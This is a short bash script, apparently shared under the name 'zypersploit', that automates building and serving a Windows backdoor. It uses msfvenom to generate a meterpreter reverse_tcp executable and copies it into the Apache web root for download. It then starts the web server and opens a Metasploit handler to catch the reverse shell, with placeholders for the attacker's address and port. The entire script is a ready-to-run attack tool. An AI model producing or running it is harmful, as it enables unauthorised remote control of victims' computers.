#!/bin/bash

clear
echo -e "\033[33mRunning setup and backdoor creation...\033[0m"
echo -e "\033[34mMade by zypersploit!\033[0m"
echo
cd ~
sudo msfvenom -p windows/meterpreter/reverse_tcp LHOST=YOUR_KALI_LINUX_INET_ADDRESS LPORT=YOUR_PORT -f exe -o backdoor.exe
mv backdoor.exe /var/www/html/
clear
cd /var/www/html/
chmod +x backdoor.exe
clear
service apache2 start
msfconsole -q -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST YOUR_KALI_LINUX_INET_ADDRESS; set LPORT YOUR_PORT; clear; exploit"
